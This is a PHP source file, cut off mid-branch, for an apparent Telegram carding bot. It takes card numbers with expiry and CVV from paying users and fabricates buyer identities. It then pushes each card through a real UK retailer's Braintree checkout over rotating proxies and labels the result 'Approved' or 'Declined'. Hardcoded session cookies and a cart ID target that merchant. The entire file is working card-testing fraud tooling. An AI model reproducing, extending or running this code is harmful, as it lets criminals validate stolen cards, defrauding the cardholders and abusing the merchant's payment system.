<?php



$ownerData = file_get_contents('database/owner.txt');
if (strpos($ownerData, "$userId") !== false) {
    $rank = "OWNER"; 
} else {
    $paidData = file_get_contents('database/paid.txt');
    $pattern = "/User ID: $userId\nRank: (.+)\n/";
    if (preg_match($pattern, $paidData, $matches)) {
        $rank = $matches[1];
    } else {
        $rank = "FREE";
    }
}

if((strpos($text, '/rb') === 0) or (strpos($text, '.rb') === 0) or ((strpos($text, '$rb') === 0) or (strpos($text, '!rb') === 0)) or ((strpos($text, '+rb') === 0) or (strpos($text, '#rb') === 0)) or (strpos($text, '?rb') === 0)) {

 $userData = file_get_contents('database/users.txt');
if (strpos($userData, $userId) === false) {
bot('sendMessage', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Unregistered User! ⚠️</code>
[↯]Message: <code>You have to register first to use me</code>
You have to use <code>/register</code> to use me 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
    'reply_to_message_id' => $message_id,
    'parse_mode' => 'html'
]);
return;
}   

if (strlen($message) <= 4) {
            bot('sendMessage', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - - 
[WRONG FORMAT] ⚠️
- - - - - - - - - - - - - - - - - - - - - -
Ex: <code>/chk cc|mm|yy|cvv</code>     
Gateway <code>Stripe 1 USD</code>        
- - - - - - - - - - - - - - - - - - - - - -
</b>",
        'reply_to_message_id' => $message_id,
        'parse_mode' => 'html'
    ]);
return;
}

$paid = file_get_contents('database/paid.txt');
if (preg_match('/User ID:\s*(\d+)/', $paid, $matches)) {
$paids = $matches[1];
}
  
$owner = file_get_contents('database/owner.txt');
$owners = explode("\n", $owner);

$authgrp = file_get_contents('database/authgrp.txt');
$authgrps = explode("\n", $authgrp);

if (!preg_match($pattern, $paidData, $matches) && !in_array($chatId, $owners)) {

if (!in_array($chatId, $authgrps)) {
      
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Not Allowed Here!⚠️</code>
[↯]Message: <code>Contact the Owner to authorize</code>
- - - - - - - - - - - - - - - - - - - - - -
</b>",
            'reply_to_message_id' => $message_id,
            'parse_mode' => 'html'
        ]);
        return;
    }
}

$spamWaitTime = isSpamming($userId);
if ($spamWaitTime !== false) {
bot('sendMessage', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ANTISPAM DETECTED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯] Try again after $spamWaitTime seconds !
- - - - - - - - - - - - - - - - - - - - - -
</b>",
            'reply_to_message_id' => $message_id,
            'parse_mode' => 'html'
        ]);
        return;
}  




$start_time = microtime(true);
  
$messageidtoedit24 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Started checking...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id,

        ]);

        $messageidtoruby = capture(json_encode($messageidtoedit24), '"message_id":', ',');
        
  if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

$lista = substr($message, 4);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$lista = (''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');

  
$last4 = substr($cc, -4);


//=========BANNED BIN=============//
$bin = substr($cc, 0, 6);
$bannedBins = file("banned.txt", FILE_IGNORE_NEW_LINES);

if (in_array($bin, $bannedBins)) {
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoruby,
            'text'=>"<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]BIN BANNED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]CC: <code>$lista</code>
[↯]Reason: <code>All Prepaid banned!</code>
 - - - - - - - - - - - - - - - - - - - - - -
</b>",
            'parse_mode'=>'html',
            
        ]);
return;
}
  
//---------------------//
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoruby,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Ruby
Status: <code>■□□□□ 20%[🟥]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);


  
function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

function pro($stringlength = 16) {
    return substr(str_shuffle(str_repeat($string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', ceil($stringlength/strlen($string)) )),1,$stringlength);
}

#$key = pro();
$web = pro();  
  
  
function generateSessionUUID() {
    $data = openssl_random_pseudo_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}

$sessionid = generateSessionUUID();
//echo $sessionid;


function generateReferenceID() {
    $data = openssl_random_pseudo_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    $uuid = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
    return "0_" . $uuid;
}
$referid = generateReferenceID();
//echo $referid;


  function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];
 


//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoruby,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Ruby
Status: <code>□■□□□ 40%[🟦]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);


//==================[BIN LOOK-UP]======================//
  $fim = json_decode(file_get_contents('https://bins.antipublic.cc/bins/'.$bin), true);
$bin1 = $fim["bin"] ?? null;

    if ($bin1 !== null) {
        $brand = $fim["brand"];
        $country = $fim["country"];
        $country_name = $fim["country_name"];
        $country_flag = $fim["country_flag"];
        
        $country_currencies = $fim["country_currencies"];
        $bank = $fim["bank"];
        $level = $fim["level"];
        $type = $fim["type"];
    }
//==================[BIN LOOK-UP-END]======================//



 
 bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoruby,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Ruby
Status: <code>□□■□□ 60%[🟨]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);
//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.silentnight.co.uk/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.silentnight.co.uk';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.7';
$headers[] = 'Path: /checkout/';
$headers[] = 'Cookie: PHPSESSID=v1tso111a0hheue7o5l08cb7dq; wp_ga4_customerGroup=NOT%20LOGGED%20IN; form_key=UzN5cqdCmT9Bh7Fd; LPVID=c0NWQ1ZGJjMzE1MmMzM2E5; mage-messages=; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; mage-cache-sessid=true; mage-banners-cache-storage=%7B%7D; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; sng_nddm={"25PILLXXXAC0093":{"qiid":"1786230","sku":"25PILLXXXAC0093","name":"Silentnight Anti-Allergy Pillows","delivery_type":"Flexible Delivery","chosen_type":"standard","override_label":"Delivery within 3-5 working days excl. bank holidays","qty":"1","date":"Tue Sep 19 2023 19:29:38 GMT+0600 (Bangladesh Standard Time)","timestamp":"1695130178.898"}}; BVImplmain_site=14217; LPSID-47255430=bJu9Li_WR3eQZQAAZV37mg; ommage=basket%3A954852%3A18.0000%3AGBP%3A30271d4ea6a6%3Ai%3D39048%26v%3D25PILLXXXAC0093%26q%3D1%26t%3D18; private_content_version=b3712177b5a32e96a81e3892d5b619fb; section_data_ids=%7B%22cart%22%3A1694842140%2C%22directory-data%22%3A1694842140%2C%22ammessages%22%3A1694842140%2C%22wp_ga4%22%3A1694842140%2C%22customweb_external_checkout_widgets%22%3A1694842140%7D; magenest_cookie_popup={"view_page":3}';
$headers[] = 'Referer: https://www.silentnight.co.uk/checkout/cart/';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result1 = curl_exec($ch);

$merchant = trim(strip_tags(getStr($result1, '"merchantId":"','"')));

// ENCODED BEARER
$enbearer = trim(strip_tags(getstr($result1, '"clientToken":"','",')));

// DECODED BEARER
$decode = base64_decode($enbearer);

// MAIN BEARER
$bearer = trim(strip_tags(getstr($decode, '"authorizationFingerprint":"','",')));
//echo "bearer: $bearer <br>";
//echo "merchant: $merchant <br>";
  


//=================REQ 4===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: payments.braintree-api.com';
$headers[] = 'path: /graphql';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.5';
$headers[] = 'content-type: application/json';
$headers[] = 'Authorization: Bearer '.$bearer.'';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'origin: https://assets.braintreegateway.com';
$headers[] = 'referer: https://assets.braintreegateway.com/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'; 

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"0bad5c46-fe46-4fb3-99a7-746dac2c5491"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result3 = curl_exec($ch);
$token = trim(strip_tags(getstr($result3, '"token":"','"')));


//=======================[5 REQ]==================================//


//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/'.$merchant.'/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: api.braintreegateway.com';
$headers[] = 'Origin: https://www.silentnight.co.uk';
$headers[] = 'Referer: https://www.silentnight.co.uk/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"20.50","additionalInfo":{"billingLine1":"York Road","billingCity":"Portsmouth","billingPostalCode":"WI2 1ZH","billingCountryCode":"GB","billingPhoneNumber":"078 4543 0660","billingGivenName":"'.$firstname.'","billingSurname":"'.$lastname.'"},"dfReferenceId":"0_46241f14-42e1-4309-800c-e34e81373d7c","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.79.1","cardinalDeviceDataCollectionTimeElapsed":343},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.79.1","_meta":{"merchantAppId":"www.silentnight.co.uk","platform":"web","sdkVersion":"3.79.1","source":"client","integration":"custom","integrationType":"custom","sessionId":"0bad5c46-fe46-4fb3-99a7-746dac2c5491"}}
');


$lookup = curl_exec($ch);
$status = trim(strip_tags(getstr($lookup, '"status":"','"')));
$enrolled = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getstr($lookup, '"enrolled":"','"')))));
$nonce = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getstr($lookup, '"nonce":"','"')))));

if ($status == "authenticate_successful") {
    $status = $status . " ✅";
    }
elseif ($status == "authenticate_attempt_successful") {    
    $status = $status . " ✅";
    } 
else {
    $status = $status . " ❌";
    }
    
    //========================//
    
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoruby,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Ruby
Status: <code>□□□■□ 80%[🟧]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);
        
        
//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.silentnight.co.uk/rest/silentnight_english/V1/guest-carts/DV6cl8IgOk8MX3J7ZI2DU3qe5YeJZN7f/payment-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: www.silentnight.co.uk';
$headers[] = 'path: /rest/silentnight_english/V1/guest-carts/DV6cl8IgOk8MX3J7ZI2DU3qe5YeJZN7f/payment-information';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.7';
$headers[] = 'content-type: application/json';
$headers[] = 'cookie: PHPSESSID=v1tso111a0hheue7o5l08cb7dq; wp_ga4_customerGroup=NOT%20LOGGED%20IN; form_key=UzN5cqdCmT9Bh7Fd; LPVID=c0NWQ1ZGJjMzE1MmMzM2E5; mage-messages=; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; mage-cache-sessid=true; mage-banners-cache-storage=%7B%7D; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; sng_nddm={"25PILLXXXAC0093":{"qiid":"1786230","sku":"25PILLXXXAC0093","name":"Silentnight Anti-Allergy Pillows","delivery_type":"Flexible Delivery","chosen_type":"standard","override_label":"Delivery within 3-5 working days excl. bank holidays","qty":"1","date":"Tue Sep 19 2023 19:29:38 GMT+0600 (Bangladesh Standard Time)","timestamp":"1695130178.898"}}; BVImplmain_site=14217; LPSID-47255430=bJu9Li_WR3eQZQAAZV37mg; ommage=basket%3A954852%3A18.0000%3AGBP%3A30271d4ea6a6%3Ai%3D39048%26v%3D25PILLXXXAC0093%26q%3D1%26t%3D18; private_content_version=b3712177b5a32e96a81e3892d5b619fb; magenest_cookie_popup={"view_page":4}; section_data_ids=%7B%22cart%22%3A1694842160%2C%22directory-data%22%3A1694842140%2C%22ammessages%22%3A1694842140%2C%22wp_ga4%22%3A1694842198%2C%22customweb_external_checkout_widgets%22%3A1694842199%2C%22messages%22%3A1694842199%7D';
$headers[] = 'origin: https://www.silentnight.co.uk';
$headers[] = 'referer: https://www.silentnight.co.uk/checkout/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'; 
$headers[] = 'x-requested-with: XMLHttpRequest';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"DV6cl8IgOk8MX3J7ZI2DU3qe5YeJZN7f","billingAddress":{"countryId":"GB","region":"Oxfordshire","street":["York Road"],"telephone":"078 4543 0660","postcode":"WI2 1ZH","city":"Portsmouth","firstname":"'.$firstname.'","lastname":"'.$lastname.'","saveInAddressBook":null},"paymentMethod":{"method":"braintree","additional_data":{"payment_method_nonce":"'.$nonce.'","device_data":"{\"device_session_id\":\"cd542b2776b0a26edcb6c02cc42cf50a\",\"fraud_merchant_id\":null,\"correlation_id\":\"a72f6f41448ef4642e742eb8e0a264c6\"}"}},"email":"'.$email.'"}
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result5 = curl_exec($ch);
$response_array = json_decode($result5, true);

if ($response_array !== null) {
    $msg = $response_array['message'];
    //echo $msg;
} else {
    //echo "Error decoding JSON.";
}
  
//=======================[MADE BY SIFAT]==============================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoruby,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Ruby
Status: <code>□□□□■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);

//=============CHECKER PART END============//

if(strpos($result5, "Thank you.")) {

$status = ("Approved ✅");  
$respo = ("Order placed");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Insufficient Funds")) {
$status = ("Approved ✅");  
$respo = ("Insufficient funds");
}
elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Card Issuer Declined CVV")) {
$status = ("Approved ✅");  
$respo = ("Card Issuer Declined CVV");
}
elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Call Issuer. Pick Up Card.")) {
$status = ("Declined ❌");  
$respo = ("Pick Up Card");
}
elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Declined - Call Issuer")) {
$status = ("Declined ❌");  
$respo = ("Declined - Call Issuer");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Issuer or Cardholder has put a restriction on the card")) {
$status = ("Declined ❌");  
$respo = ("Issuer or Cardholder has put a restriction on the card");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Cannot determine payment method.")) {
$status = ("Declined ❌");  
$respo = ("Cannot determine payment method");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Do Not Honor")) {
$status = ("Declined ❌");  
$respo = ("Do Not Honor");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Card Not Activated")) {
$status = ("Declined ❌");  
$respo = ("Card Not Activated");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Closed Card")) {
$status = ("Declined ❌");  
$respo = ("Closed Card");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Gateway Rejected: risk_threshold")) {
$status = ("Declined ❌");  
$respo = ("Gateway Rejected: risk_threshold");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Cannot Authorize at this time (Life cycle)")) {
$status = ("Declined ❌");  
$respo = ("Cannot Authorize at this time (Life cycle)");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Unknown or expired payment_method_nonce.")) {
$status = ("Declined ❌");  
$respo = ("BIN country in high risk country - Decline (40184)");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Processor Declined - Fraud Suspected")) {
$status = ("Declined ❌");  
$respo = ("Processor Declined - Fraud Suspected");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Invalid Transaction")) {
$status = ("Declined ❌");  
$respo = ("Invalid Transaction");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Transaction Not Allowed")) {
$status = ("Declined ❌");  
$respo = ("Transaction Not Allowed");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Gateway Rejected: three_d_secure")) {
$status = ("Declined ❌");  
$respo = ("Gateway Rejected: three_d_secure");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. No Account")) {
$status = ("Declined ❌");  
$respo = ("No Account");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Expired Card")) {
$status = ("Declined ❌");  
$respo = ("Expired Card");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Processor Declined")) {
